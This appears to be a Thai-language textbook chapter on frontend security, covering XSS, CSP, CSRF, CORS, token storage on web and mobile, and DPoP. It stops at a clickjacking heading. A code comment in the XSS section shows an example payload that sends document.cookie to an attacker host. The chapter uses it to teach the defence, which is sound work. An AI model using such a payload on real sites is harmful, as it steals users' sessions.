# บท 16 — Frontend Security: ทำไมซ่อนปุ่มด้วย `isAdmin && ...` ถึงไม่ใช่การจัดการสิทธิ์

> ประโยคแกนของบท: **frontend validation ช่วย UX — backend คือ security boundary จริง** ทุก byte ที่ส่งไปให้ browser คือ byte ที่ผู้ใช้อ่านได้ แก้ได้ ปลอมได้ — งานของ frontend security จึงไม่ใช่ "กันผู้ใช้โกง" (นั่นงาน server) แต่คือ "กันผู้ใช้*ถูกโจมตีผ่านแอปของเรา*"

## เข็มทิศก่อนอ่าน

หลังจากคุยเรื่อง performance, accessibility และ testing มาแล้ว บทนี้เพิ่มมิติที่ทีม frontend มักถูกคาดหวังมากขึ้นเรื่อย ๆ คือความปลอดภัย แต่ต้องเริ่มจากกรอบความคิดที่ถูกก่อน: frontend ไม่ได้มีอำนาจ enforce สิทธิ์แทน server มันมีหน้าที่ลดพื้นผิวการโจมตีและไม่เปิดทางให้ผู้ใช้ถูกโจมตีผ่านแอปของเรา

ให้อ่านโดยแยก UX concern ออกจาก security concern ให้เด็ดขาด เช่น validation, hide/show UI และ disable button อาจช่วยประสบการณ์ใช้งาน แต่ไม่ได้เท่ากับการ authorize หรือปกป้องข้อมูล ความชัดเจนจุดนี้จะทำให้บท production และ system design ตัดสินใจได้แม่นขึ้น

## Frontend Security คืออะไร ก่อนจะคุยเรื่อง XSS, CSRF หรือ CORS

เวลาพูดคำว่า "security" คนจำนวนมากจะเผลอคิดถึงการ "กันคนร้ายไม่ให้ทำอะไรกับระบบได้" แล้วจึงรีบไปหาเทคนิคอย่าง token, role หรือการซ่อนปุ่ม แต่ถ้ามองจากมุม frontend ก่อน คำถามแรกที่ถูกกว่าคือ **browser ที่ผู้ใช้เปิดแอปของเราอยู่ กำลังเสี่ยงถูกหลอก ถูกขโมยข้อมูล หรือถูกใช้เป็นทางผ่านไปโจมตีระบบของเราอย่างไรบ้าง**

ดังนั้น frontend security จึงหมายถึงการออกแบบหน้าเว็บ, JavaScript, การเก็บข้อมูล และการคุยกับ backend ให้ลดโอกาสเกิดเรื่องเหล่านี้ เช่น

- ผู้ใช้เปิดหน้าเว็บเราแล้วถูกฉีด script แปลกปลอมเข้ามา
- ผู้โจมตีใช้ browser ของผู้ใช้ที่ login ค้างไว้ ยิงคำสั่งแทนเจ้าตัว
- แอปเผลอเปิดเผยข้อมูลหรือ secret ที่ไม่ควรอยู่ฝั่ง client
- ทีมสับสนระหว่าง "ซ่อน UI" กับ "ป้องกันสิทธิ์จริง"

ภาพจำที่ช่วยมากคือ: **frontend security ไม่ใช่กำแพงชั้นสุดท้ายของระบบ แต่เป็นด่านที่ต้องไม่กลายเป็นทางเข้าให้ผู้โจมตีและต้องไม่ทำร้ายผู้ใช้ของเราเอง** พอวางกรอบนี้ถูกแล้ว เวลาคุยเรื่อง XSS, CSRF, CSP, CORS หรือ token storage จะไม่หลงไปคิดว่ามันเป็นเทคนิคแยก ๆ แต่จะเห็นว่าแต่ละตัวกำลังปิดช่องเสี่ยงคนละแบบ

อีกจุดที่ควรแยกให้ออกตั้งแต่ต้นคือ:

- **ความปลอดภัยของข้อมูล**: อะไรไม่ควรส่งมาที่ browser เลย
- **ความปลอดภัยของการโต้ตอบ**: browser จะถูกหลอกให้ยิงคำสั่งแทนผู้ใช้ได้ไหม
- **ความปลอดภัยของการ render**: ข้อความหรือ HTML จากภายนอกจะกลายเป็น code ที่รันได้ไหม

สามชั้นนี้คือแผนที่ของบทนี้ทั้งหมด

## Mindset แกน — Frontend ไม่ใช่ Security Boundary

สถานการณ์จริง: จูเนียร์ในทีมซ่อนปุ่ม "ลบผู้ใช้" ด้วย `{isAdmin && <DeleteButton />}` แล้วรายงานว่า "จัดการสิทธิ์เรียบร้อย" — สองสัปดาห์ต่อมามีคนเปิด DevTools แก้ `isAdmin` ใน state เป็น true (หรือง่ายกว่านั้น: copy request จาก Network tab แล้วยิงตรงด้วย curl) ลบข้อมูลสำเร็จ เพราะ endpoint ฝั่ง server ไม่เช็คสิทธิ์เลย

หลักที่ต้องฝังในหัว: **browser เป็นเครื่องของผู้ใช้ ไม่ใช่ของเรา** — โค้ด, state, request ทุกอย่างอยู่ในมือเขา คำถามสัมภาษณ์ยอดฮิต *"จะป้องกันผู้ใช้แก้ role จาก DevTools ยังไง?"* คำตอบ senior คือ **"ป้องกันไม่ได้ และไม่ต้องป้องกัน"** — การซ่อนปุ่มใน FE คือ UX (ไม่โชว์ของที่ใช้ไม่ได้ให้รก) ส่วน security คือ server ต้อง authorize **ทุก request** ที่เข้ามา โดยดูจาก session/token ที่ verify แล้ว ไม่ใช่จาก field ใดๆ ที่ client ส่งมา (เล่ม backend บท 6 เรื่อง authN/authZ, บท 20 เรื่อง security in depth) — เช่นเดียวกับราคา: ส่ง `price` จาก client ไปให้ server เชื่อ = เชิญคนซื้อ iPhone ราคา 1 บาท server ต้องดึงราคาจากฐานข้อมูลเองเสมอ

Analogy: frontend validation คือ**พนักงานต้อนรับหน้าร้าน** — ช่วยลูกค้ากรอกฟอร์มถูกตั้งแต่แรก ลด round-trip แต่ตู้เซฟต้องมีกุญแจของตัวเอง จะปล้นธนาคารไม่มีใครหยุดที่แผนกต้อนรับ

แนวตอบ senior: *"ผม validate สองที่ด้วยเหตุผลคนละอย่าง — FE เพื่อ feedback เร็ว, BE เพื่อความปลอดภัยและ integrity เพราะ request มาจากที่ไหนก็ได้ไม่ใช่แค่จากแอปเรา — และ FE ไม่ถือความลับหรือการตัดสินใจเชิงสิทธิ์ใดๆ"*

## XSS — สามสายพันธุ์ของการฉีดสคริปต์

**XSS (Cross-Site Scripting)** = การทำให้ script ของผู้โจมตีรันในหน้าเว็บของเรา ภายใต้ origin ของเรา — พอรันได้มันคือ*ตัวเรา*ในสายตา browser: อ่าน cookie ที่ JS อ่านได้, ยิง API ด้วย session ผู้ใช้, เก็บทุก keystroke, วาดหน้า login ปลอม สามชนิดต่างกันที่ "payload อาศัยอยู่ไหน":

1. **Reflected** — payload อยู่ใน URL แล้วสะท้อนกลับมาในหน้า: `search?q=<script>...</script>` ถ้าหน้า render "ผลค้นหาของ *q*" โดยไม่ escape → เหยื่อแค่**คลิกลิงก์**ที่ผู้โจมตีส่งมา (email/แชท) ก็โดน
2. **Stored** — payload ถูก**บันทึกลง DB**: comment, ชื่อโปรไฟล์, รีวิวสินค้า ที่มี script ฝัง → ทุกคนที่เปิดหน้านั้นโดนหมด อันตรายสุดเพราะเหยื่อไม่ต้องทำอะไรเลย — เหมือนฝังกับดักไว้ใน**สมุดเยี่ยม**ที่ทุกคนต้องเปิดอ่าน
3. **DOM-based** — server ไม่เกี่ยวเลย: JS ฝั่ง client เอาข้อมูลจาก source ที่ผู้ใช้คุมได้ (`location.hash`, `document.referrer`) ไปใส่ sink อันตราย (`innerHTML`, `eval`) — ตรวจจาก log ฝั่ง server ไม่เห็นด้วยซ้ำ

ตัวอย่าง DOM-based ที่เจอจริงในโค้ดรีวิว — หน้า error ที่อยากโชว์ว่า user ค้นอะไรมา:

```ts
// ❌ source (ผู้ใช้คุม URL ได้) ไหลตรงเข้า sink
const q = new URLSearchParams(location.search).get("q");
resultEl.innerHTML = `ไม่พบผลลัพธ์ของ "${q}"`;
// โจมตี: ?q=<img src=x onerror="fetch('//evil.io?c='+document.cookie)">
// ส่งลิงก์นี้ให้เหยื่อคลิก — script รันใน origin ของเราทันที

// ✅ ใช้ sink ที่เป็น text เสมอเมื่อไม่ต้องการ HTML
resultEl.textContent = `ไม่พบผลลัพธ์ของ "${q}"`;
```

สังเกตว่า payload ไม่ใช่ `<script>` ตรงๆ — `innerHTML` ไม่รัน `<script>` ที่แปะเข้าไป แต่ `onerror` ของ `<img>` รัน: การจำ "แค่กรองคำว่า script ก็พอ" คือความเข้าใจผิดที่เจาะได้เสมอ

## ทำไม React/Angular กันให้เกือบหมด — แล้วยังเจาะได้ตรงไหน

Framework ยุคนี้ **escape ค่าโดย default**: `{userInput}` ใน JSX และ `{{ userInput }}` ใน Angular ถูกแปลงเป็น text node — `<script>` กลายเป็นตัวหนังสือ `&lt;script&gt;` ไม่ใช่ element นี่คือเหตุผลที่ XSS "แบบตำรา" แทบหายไปจากแอป React/Angular แต่ช่องที่เหลือคือ**ประตูที่เราเปิดเอง** — และชื่อ API ก็ตะโกนเตือนอยู่แล้ว:

- **`dangerouslySetInnerHTML`** (React) / **`bypassSecurityTrustHtml`** (Angular — Angular มี sanitizer ในตัวสำหรับ `[innerHTML]` แต่ bypass คือการปิดมัน) — ใช้กับข้อมูลที่ผู้ใช้ป้อนโดยไม่ sanitize = เปิดประตู stored XSS เต็มบาน
- **`href` / URL attribute** — auto-escape กัน HTML injection แต่ไม่ได้ตรวจ*ความหมาย*ของ URL: `<a href={userUrl}>` ที่ userUrl = `javascript:alert(1)` คือ XSS ตอนคลิก (Angular sanitize ตรงนี้ให้, React ตั้งแต่ v16.9 แค่ warn — ต้อง validate scheme เองให้เหลือ http/https)
- **Third-party script** — `<script src="https://cdn.analytics.io/tag.js">` รันด้วยสิทธิ์เต็มของหน้าเรา: CDN โดน compromise = เราโดนด้วย (เคส Magecart ขโมยเลขบัตรจากหน้า checkout ผ่าน script วิเคราะห์ที่ถูกฝังโค้ด และเคส polyfill.io ปี 2024 ที่โดเมนถูกซื้อไปแล้วเสิร์ฟ script มุ่งร้ายใส่เว็บนับแสน)

## Sanitization vs Escaping — คนละงาน

- **Escaping** = ทำให้ข้อมูล*ถูกแสดงเป็นตัวหนังสือ*: `<b>` กลายเป็น `&lt;b&gt;` เห็นเป็นข้อความ — ใช้เมื่อไม่ต้องการให้เป็น HTML เลย (default ของ framework)
- **Sanitization** = *ยอมให้เป็น HTML แต่คัดกรอง*: เก็บ `<b><p><a>` ทิ้ง `<script>`, `onerror=`, `javascript:` — ใช้เมื่อ**ต้อง** render HTML จริง (rich text editor, บทความจาก CMS, ผล render markdown)

เมื่อจำเป็นต้องใช้ ให้ผ่าน **DOMPurify** — มาตรฐานพฤตินัยที่ parse HTML ด้วย parser ของ browser จริงแล้ว whitelist:

```tsx
import DOMPurify from "dompurify";

function ArticleBody({ html }: { html: string }) {
  // sanitize ทุกครั้งก่อนเข้า sink — อย่าเชื่อว่า "ฝั่ง save ทำแล้ว" (defense in depth)
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

ห้ามเขียน sanitizer เองด้วย regex — HTML parser มี edge case ระดับที่ regex ตามไม่ทัน (`<img src=x onerror=...>`, encoding แปลกๆ) นี่คือปัญหาที่โลกแก้แล้ว

## CSP — ชั้นป้องกันสุดท้ายเมื่อ XSS หลุด

**CSP (Content Security Policy)** คือ HTTP header ที่บอก browser ว่า "หน้าเว็บนี้อนุญาตให้โหลด/รันอะไรจากไหน" — analogy: **รายชื่อแขกที่ประตูงาน** ต่อให้ผู้โจมตีฉีด `<script>` เข้ามาได้ (XSS หลุดชั้นแรกแล้ว) script ที่ไม่อยู่ในรายชื่อจะไม่ถูกรัน — CSP ไม่ได้กัน XSS แต่**ลดความเสียหายเมื่อกันไม่อยู่** (defense in depth — เล่ม backend บท 20)

แนวปัจจุบัน (CSP Level 3) เลิกใช้ whitelist รายโดเมน (ยาว เปราะ และ bypass ได้ผ่าน JSONP/gadget บนโดเมนที่ whitelist) → ใช้ **nonce + strict-dynamic**:

```http
Content-Security-Policy:
  script-src 'nonce-r4nd0m123' 'strict-dynamic';
  object-src 'none'; base-uri 'none';
```

กลไก: server สุ่ม nonce ใหม่ทุก response แปะทั้งใน header และ `<script nonce="r4nd0m123">` — script ที่ไม่มี nonce (เช่นตัวที่ XSS ฉีด) ไม่รัน ส่วน `strict-dynamic` = "script ที่มี nonce แล้ว โหลด script ต่อได้" แก้ปัญหา third-party tag ที่โหลดลูกโซ่ **Trusted Types** เป็นชั้นถัดไป: header `require-trusted-types-for 'script'` ทำให้การยัด string ดิบใส่ sink (`innerHTML`, `eval`) โยน error ทันที — ต้องผ่าน policy ที่ sanitize ก่อนเท่านั้น เท่ากับปิด DOM-based XSS เชิงโครงสร้าง (สถานะ 2026: Chromium ใช้ได้เต็มมานาน แต่ browser engine อื่นยังตามไม่ครบ — ยังไม่เข้า Baseline ตรวจ caniuse ก่อนพึ่งเป็นชั้นหลัก และวางให้ degrade ได้ถ้า browser ไม่รองรับ)

ใช้ผิดพังยังไง: ใส่ `'unsafe-inline'` เพื่อ "ให้มันใช้ได้ก่อน" = ปิด CSP ทั้งใบโดยยังจ่ายค่า header อยู่ ลำดับ rollout ที่ถูก: เริ่มจากโหมดรายงานก่อนเสมอ —

```http
Content-Security-Policy-Report-Only:
  script-src 'nonce-r4nd0m123' 'strict-dynamic'; report-to csp-endpoint
```

โหมดนี้ browser ไม่ block อะไร แค่ส่งรายงาน violation มาให้ — รันสักหนึ่งถึงสองสัปดาห์ เก็บว่ามี inline script/third-party ตัวไหนที่จะพังบ้าง เคลียร์ให้หมด แล้วค่อยสลับเป็น header จริง — เปิด CSP แบบ big bang ในแอปที่มี script เก่าเยอะ = หน้าขาวทั้งเว็บใน production

## CSRF — Browser ที่ซื่อสัตย์เกินไป

**CSRF (Cross-Site Request Forgery)**: เหยื่อ login `bank.com` ค้างไว้ แล้วเปิด `evil.com` ซึ่งมี form ที่ auto-submit POST ไป `bank.com/transfer` — กลไกคือ browser **แนบ cookie ของ bank.com ให้เองเสมอ**เมื่อ request วิ่งไปหา bank.com ไม่ว่าใครเป็นคนสั่งยิง — เหมือน**ตราประทับบริษัทที่ประทับให้ทุกซองอัตโนมัติ** ใครหลอกให้เราส่งซองได้ ซองนั้นก็มีตราครบ ส่วน token ใน header (`Authorization: Bearer ...`) ไม่โดน เพราะ JS ของ evil.com อ่าน token ข้าม origin ไม่ได้และ browser ไม่แนบ header ให้เอง — **CSRF เป็นโรคของ cookie-based auth เท่านั้น**

การป้องกันปัจจุบัน:

- **`SameSite`** — ปี 2026 Chrome (และแนวเดียวกันในเบราว์เซอร์หลัก) ตั้ง cookie ที่ไม่ระบุเป็น **`Lax` โดย default** มาหลายปีแล้ว: cookie ไม่ถูกแนบใน cross-site POST/iframe/รูป แต่*ยังแนบ*ใน top-level GET navigation → กันเคสคลาสสิกได้มาก แต่ยังไม่หมด: endpoint ที่เผลอทำ side effect ผ่าน GET, subdomain ที่ถูกยึด (same-site กันเอง), และ default ที่ browser เก่า/edge case ไม่บังคับ
- **ยังต้อง CSRF token ไหม?** คำตอบ senior: ตั้ง `SameSite=Lax` (หรือ `Strict` กับ cookie ที่ sensitive) **อย่างชัดเจน** อย่าพึ่ง default + สำหรับ mutation สำคัญยังใส่ CSRF token (double-submit หรือ synchronizer — เล่ม backend บท 6) — สองชั้นเพราะชั้นเดียวมีรูรั่วคนละแบบ · เกร็ดที่เกี่ยว: แผน phase-out third-party cookie ของ Chrome ถูก**ยกเลิกแล้ว** (ประกาศกลางปี 2024 และถอน prompt ในปี 2025) — อย่าไปตอบสัมภาษณ์ว่า "เดี๋ยว cookie ข้าม site ก็ตายแล้วไม่ต้องกัน"

ฝั่ง frontend มีหน้าที่ในกลไก token ด้วย — double-submit ฉบับย่อ: server ตั้ง cookie `csrf_token` (ตัวนี้*ไม่* httpOnly โดยตั้งใจ) แล้ว FE อ่านมาแนบ header ทุก mutation:

```ts
// evil.com ทำข้อนี้ไม่ได้: มันสั่ง browser แนบ cookie ได้ แต่ "อ่านค่า" cookie ข้าม origin ไม่ได้
api.interceptors.request.use((config) => {
  if (config.method !== "get") {
    config.headers["X-CSRF-Token"] = readCookie("csrf_token");
  }
  return config;
});
// server เทียบ header กับ cookie — ตรงกัน = คนยิงอ่าน cookie ได้จริง = มาจาก origin เรา
```

## CORS — เกราะของผู้ใช้ ไม่ใช่ของ Server

ความเข้าใจผิดยอดฮิตที่คั่นกลาง junior/senior: "ตั้ง CORS เข้มๆ แล้ว server ปลอดภัย" — ผิดทิศ **CORS (Cross-Origin Resource Sharing)** คือกลไกที่ *browser* ใช้ตัดสินว่าจะยอมให้ *JS ของ site อื่นอ่าน response* จาก origin เราไหม — มันปกป้อง**ผู้ใช้** (กัน evil.com ใช้ browser ของเหยื่อไปอ่านข้อมูลจาก API เราด้วย cookie ของเหยื่อ) ไม่ได้ปกป้อง server: curl, Postman, script ฝั่ง server ไม่มี CORS และยิงตรงได้เสมอ — server จึงยังต้อง authenticate/authorize ทุก request เหมือนเดิม (วนกลับ mindset แกนของบท) ที่ตามมา: การตั้ง `Access-Control-Allow-Origin: *` กับ endpoint สาธารณะที่ไม่ใช้ cookie ไม่ใช่ช่องโหว่ในตัวมันเอง แต่การ echo `Origin` กลับแบบไม่ตรวจ *พร้อม* `Allow-Credentials: true` คือการยกข้อมูลผู้ใช้ให้ทุกโดเมนบนโลก

## Token เก็บไหนดี — ข้อถกเถียงจริง

| ที่เก็บ | XSS ขโมยได้? | CSRF? | หมายเหตุ |
|---|---|---|---|
| `localStorage` | ✅ โดนเต็ม — JS ใดๆ ในหน้าอ่านได้ | ❌ ไม่เกิด (ต้องแนบเองใน header) | ง่ายสุด เสี่ยงสุด |
| Memory (ตัวแปร JS) | บางส่วน (script ที่รันอยู่ยัง exfiltrate ได้) | ❌ | หายตอน refresh — ต้องคู่ refresh token |
| Cookie `httpOnly` + `Secure` + `SameSite` | ❌ JS **อ่านไม่ได้** | ⚠️ เกิดได้ — ต้องกันเพิ่ม | ภาระไปอยู่ที่ CSRF protection |

ประเด็นที่มักเข้าใจผิด: httpOnly ไม่ได้กัน XSS — script ที่ฉีดเข้ามาแล้วยัง*ยิง request ในนามผู้ใช้*ได้อยู่ดี (cookie แนบให้เอง) มันกันแค่ "การ*ขโมย* token ออกไปใช้ที่อื่น/หลัง session จบ" ซึ่งก็ลด blast radius ได้จริง

คำแนะนำปัจจุบัน: **access token ใน httpOnly cookie (`Secure`, `SameSite=Lax/Strict`) + CSRF protection** หรือขั้นกว่าคือ **BFF (Backend For Frontend)**: browser ถือแค่ session cookie ธรรมดา ส่วน token จริง (ของ IdP/บริการหลังบ้าน) อยู่ที่ BFF server ไม่เคยลงมาแตะ browser เลย — token ที่ browser ไม่เคยเห็นคือ token ที่ browser ทำหลุดไม่ได้

## Mobile — เมื่อ Threat Model เปลี่ยน Token เก็บไหน

ตารางข้างบนเป็นโลกของ browser — พอย้ายไป native (React Native, Flutter) **เหตุผลของ httpOnly แทบหายไป** เพราะ httpOnly กันอย่างเดียวคือ `document.cookie` (JS ในหน้า) อ่าน cookie เพื่อลด blast radius ของ XSS แต่ native **ไม่มี DOM, ไม่มี `document.cookie`, ไม่มีช่องให้ inject JS แปลกปลอมมารันใน context แอป** — ภัยที่ httpOnly กันจึงแทบไม่มีอยู่ ข้อได้เปรียบเลยหายตาม อย่ายก assumption ของเว็บมาใส่ mobile ตรง ๆ

ภัยหลักของ mobile คนละตัวกับเว็บ: ไม่ใช่ XSS แต่คือ **เครื่องถูก root/jailbreak, แอปอื่นอ่าน storage, reverse engineer, token หลุดผ่าน cloud backup** — ทางเก็บที่ตรง threat model จึงเป็น **hardware-backed secure storage**:

- iOS: **Keychain** (key ผูกกับ Secure Enclave ได้)
- Android: **Keystore / EncryptedSharedPreferences**
- lib ข้ามแพลตฟอร์ม: `react-native-keychain`, `expo-secure-store`, `flutter_secure_storage`

**ห้ามเก็บ token ใน `AsyncStorage` (RN) / `SharedPreferences` ธรรมดา / plain file เด็ดขาด** — ไม่เข้ารหัส อ่านได้บนเครื่อง root และหลุดผ่าน auto-backup (iCloud/Android)

แบ่งที่เก็บตามชนิด token:

| token | เก็บที่ไหน | เหตุผล |
|---|---|---|
| **Access token** (อายุสั้น 5–15 นาที) | memory ระหว่าง session + secure storage | อายุสั้น หลุดก็ window แคบ; อยู่ใน RAM ดึงยากกว่า disk |
| **Refresh token** (อายุยาว sensitive สุด) | **secure storage เท่านั้น** (Keychain/Keystore), gate biometric ถ้าเป็นแอปการเงิน | ออก access token ใหม่ได้ = หลุดยาว |

```dart
// Flutter — flutter_secure_storage: this-device-only + ไม่ backup
const storage = FlutterSecureStorage(
  aOptions: AndroidOptions(encryptedSharedPreferences: true),
  iOptions: IOSOptions(accessibility: KeychainAccessibility.first_unlock_this_device),
);
await storage.write(key: 'refresh_token', value: refreshToken);
```

Hardening ที่ควรทำคู่กัน: **this-device-only / no-backup flag** (กันหลุดผ่าน cloud), **biometric gate** สำหรับแอป sensitive, **access token อายุสั้น + refresh rotation** (server หมุน refresh ทุกครั้ง + detect reuse — เจอ token เก่าถูกใช้ = เพิกถอนทั้งสาย), **เคลียร์ทุกที่ตอน logout**, **attestation** (การให้ OS พิสูจน์กับ server ว่า request มาจาก "แอปจริงของเราบนเครื่องที่ยังไม่ถูกดัดแปลง" — Play Integrity ฝั่ง Android / App Attest ฝั่ง iOS — กันคนถอด token ไปยิงผ่าน script หรือ emulator ที่ไม่ใช่แอปเรา) และจำว่า **JWT เพิกถอนยาก** (bearer — ใครถือก็ใช้ได้จนหมดอายุ) จึงต้อง TTL สั้น + มี denylist/introspection ฝั่ง server ถ้าต้อง revoke ทันที

**CSRF ก็เปลี่ยน:** native ไม่มี "หน้าเว็บ origin อื่น" มาสั่งยิงแอปคุณ ความเสี่ยง CSRF จึงแทบไม่มี (นอกจากใช้ WebView) แนวทางที่นิยมบน mobile เลยเป็น **Bearer token ใน header** (อ่านจาก secure storage มาแนบเอง) ซึ่งตัด CSRF ไปในตัว — httpOnly cookie ยัง make sense เฉพาะเมื่อใช้ WebView เป็นหลัก หรืออยากได้ session parity กับเว็บ/ใช้ BFF ตัวเดียวกัน (บท 17)

| | Web | Mobile (native) |
|---|---|---|
| ภัยหลัก | XSS | เครื่อง root, reverse engineer, backup leak |
| หนีด้วย | httpOnly cookie | hardware keystore |
| CSRF | ต้องกัน (SameSite + token) | แทบไม่มี (Bearer header) |

**แนวตอบ senior:** *"บน native ไม่ยก httpOnly มาเป็น default เหมือนเว็บ เพราะไม่มี XSS/DOM ให้มันกัน — เก็บ refresh token ใน Keychain/Keystore (gate biometric ได้), access token อายุสั้นถือใน memory, แนบเป็น Bearer header ซึ่งตัด CSRF ไปในตัว แล้วเสริม rotation + short TTL + attestation เพราะ secure storage แค่ยกต้นทุน ไม่การันตี"*

## Bearer Token มีจุดตายเดียวกัน — Proof-of-Possession

Bearer token ทุกชนิด (JWT, session id, refresh token, pre-signed URL) มีจุดตายร่วมกัน: **"ถือ = ใช้ได้"** — ใครขโมยไปก็สวมรอยได้ทันที การเก็บให้มิด (secure storage) แค่ *ลดโอกาสถูกขโมย* ไม่ได้แก้ว่า *ถ้าถูกขโมยแล้วยังใช้ได้* ทางแก้เชิงโครงสร้างคือ **Proof-of-Possession (PoP)** — ทำให้ "ถือค่าเฉย ๆ ไม่พอ" ต้อง **พิสูจน์ว่าถือ key อยู่ตอนนี้** ด้วย

**กลไก: ผูก token กับ key pair ที่อยู่ใน hardware** (Secure Enclave/Keystore) แบบ non-extractable — private key ออกจาก hardware ไม่ได้ ใช้เซ็นได้แต่อ่าน raw ไม่ได้:

```
1. app สร้าง EC P-256 key pair ใน Secure Enclave/Keystore (private key non-extractable)
2. ตอน login/สร้าง session → ส่ง PUBLIC key ไปให้ server ผูกกับ session
3. ทุก request → เซ็น (challenge/method/url/timestamp) ด้วย PRIVATE key แนบไปกับ request
4. server verify ลายเซ็นกับ public key ที่ผูกไว้ → ผ่านเฉพาะคนที่ "ถือ private key จริง"
```
ผลลัพธ์: ขโมย token/session id ไปเปล่า ๆ **เซ็นไม่ได้ = ใช้ไม่ได้** เพราะ private key ไม่เคยออกจาก hardware — นี่คือแนวคิดเบื้องหลัง **DPoP (Demonstrating Proof-of-Possession)** และ **mTLS (mutual TLS)**

> **จุดที่คนเข้าใจผิดบ่อยที่สุด — sign/verify ไม่ใช่ encrypt/decrypt:** หลายคนติดภาพว่า "server เอา public key ไป *ถอด* proof แล้วได้ค่าออกมาไปเทียบ" — **ผิด** นั่นคือภาพของ decrypt กลไกที่ใช้จริงคือ **signature verification**:
> - **encrypt/decrypt** = ซ่อนข้อมูล · public **encrypt** → private **decrypt** ได้ข้อความกลับมา
> - **sign/verify** = พิสูจน์ความแท้ (ไม่ซ่อน) · private **sign** → public **verify** ได้ **`true`/`false`** เท่านั้น
>
> `verify(signingInput, signature, publicKey) → true/false` — มันไม่ได้ "คายค่า" อะไรออกมาให้ไปหาเทียบต่อ มันรับ 3 อย่างที่มีอยู่แล้ว (ข้อมูล + ลายเซ็น + public key) แล้วตอบว่า "เข้ากันทาง math ไหม" จบในตัว · ข้อมูลใน proof — `htm` (HTTP method ของ request นี้), `htu` (HTTP URI ที่ยิงไป), `jti` (id สุ่มไม่ซ้ำต่อ proof กัน replay) — **อ่านออกปกติ ไม่ได้ถูกซ่อน** สามค่านี้แหละที่ทำให้ proof "ผูกกับ request นี้ใบนี้เท่านั้น" (เซ็นทับ method+url+id) ขโมย proof ไปยิง endpoint อื่นหรือยิงซ้ำไม่ได้ — signature แค่การันตีว่ามันไม่ถูกแก้และมาจากคนถือ private key จริง (ความลับตอนส่งเป็นงานของ TLS คนละชั้น)

ดังนั้น server verify proof เป็น **2 ขั้นแยกกัน อย่าปน** — โดยมี 2 ที่ที่เก็บ public key คนละรูป: **`jwk` (JSON Web Key — public key ตัวเต็มที่ app แนบมาในหัวของ proof)** กับ **`cnf.jkt` (confirmation claim ในตัว access token — เก็บแค่ `jkt` = thumbprint/แฮชย่อของ public key ที่ token ผูกไว้ตอนออก)**:

1. **verify ลายเซ็น** ด้วย `jwk` ในproof → ได้ `true/false` ("ถือ private key ที่คู่กับ jwk นี้จริงไหม")
2. **เทียบ thumbprint** — `hash(jwk) == cnf.jkt` ในaccess token → ("`jwk` ที่เพิ่ง verify ผ่าน คือ key ตัวเดียวกับที่ token เป็นเจ้าของไหม" — กันคนเอา key ของตัวเองมาเซ็น proof สวย ๆ แล้วแนบ token ของคนอื่น)

ขั้น 1 คือ verify (คืน bool ไม่มีค่าให้เทียบ) · ขั้น 2 ต่างหากที่ "เอาค่าไปเทียบว่าตรงไหม" (thumbprint เทียบ `cnf.jkt`) — คนมักเอาสองขั้นนี้ไปปนกันแล้วนึกว่า verify ต้องคายค่าออกมา

**ขอ public key อย่างไร** — ไม่ได้ "ขอ" ตรง ๆ แต่ **สร้าง key pair** แล้ว API คืน public key ออกมา (อันเดียวที่ export ได้) ตัวอย่าง Android Keystore:

```kotlin
val kpg = KeyPairGenerator.getInstance(KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore")
kpg.initialize(
  KeyGenParameterSpec.Builder("session-key", KeyProperties.PURPOSE_SIGN)
    .setAlgorithmParameterSpec(ECGenParameterSpec("secp256r1"))
    .setDigests(KeyProperties.DIGEST_SHA256)
    .setIsStrongBoxBacked(true)             // ใช้ StrongBox ถ้ามี (ครอบ try/catch)
    .build())
val kp = kpg.generateKeyPair()
val publicKeyDer = kp.public.encoded        // X.509 SPKI DER → ส่งไป server; private อยู่ใน Keystore
```
```ts
// RN — react-native-biometrics ห่อ Secure Enclave/Keystore ให้
const { publicKey } = await rnb.createKeys();                    // คืน public key → ส่งไป server
const { signature } = await rnb.createSignature({ payload: challenge }); // เซ็นด้วย private key ใน hardware
```
(iOS ใช้ `SecKeyCreateRandomKey` + `kSecAttrTokenIDSecureEnclave` แล้ว `SecKeyCopyPublicKey`; Flutter ใช้ `biometric_signature` หรือ platform channel)

**อย่าเผลอทำ 2 ท่าที่ไม่ช่วยอะไร** (หลักเดียวกับ "secret ที่ client ถอดได้ = ไม่ลับ"):

- **ผูก session กับ deviceId** — deviceId เป็น *ตัวระบุ* ไม่ใช่ *ความลับ* มันเดินทาง/เก็บที่เดียวกับ token → ขโมยทีเดียวได้ทั้งคู่ แล้ว spoof ส่งให้ตรงได้ (แถม deviceId บน mobile ไม่เสถียร — iOS/Android จำกัด)
- **เอา deviceId ไป encrypt token** — encrypt ด้วย key ที่ไม่ลับ = obfuscation ไม่ใช่ security, และ server ต้องได้ plaintext ไป lookup อยู่ดี ส่วนการเข้ารหัสตอนเดินทางเป็นงานของ TLS อยู่แล้ว

ความต่างคือ PoP วางความปลอดภัยบน **"พิสูจน์การถือ private key"** (export ไม่ได้ → copy ไม่ได้) ไม่ใช่ **"รู้ค่า id"** (copy ได้) — deviceId เก็บไว้ใช้เป็น **signal ตรวจจับความผิดปกติ** (device เปลี่ยนกะทันหัน → challenge) ได้ แต่ห้ามให้มันเป็นสิ่งตัดสินว่า request ถูกกฎหมายไหม

ข้อควรรู้จากหน้างาน: **รูปแบบ public key ต่างกันแต่ละแพลตฟอร์ม** (iOS X9.63, Android SPKI, lib คืน base64) → normalize เป็น **JWK (JSON Web Key)** ที่ server จะคุมง่ายและเข้ากับ DPoP โดยตรง · **key ถูก invalidate ได้** ถ้าเพิ่ม biometric ใหม่ (ตั้ง invalidate-on-enrollment) → ต้อง re-register public key · **StrongBox/Secure Enclave ไม่มีทุกเครื่อง** → fallback TEE (Trusted Execution Environment) อย่าให้ crash

**แนวตอบ senior:** *"secure storage ลดโอกาสถูกขโมย แต่ bearer token ยังมีจุดตายว่าถือ=ใช้ได้ — ทางแก้รากคือ sender-constrained ด้วย DPoP/mTLS: สร้าง key pair ใน Secure Enclave/Keystore, ผูก session กับ public key, ให้ทุก request เซ็นด้วย private key ที่ export ไม่ได้ ขโมย token ไปเซ็นไม่ได้ก็ใช้ไม่ได้ — ห้ามผูก/encrypt ด้วย deviceId เพราะมันเป็น id ที่ copy ได้ ไม่ใช่ secret"*

## Clickjacking — UI Redressing

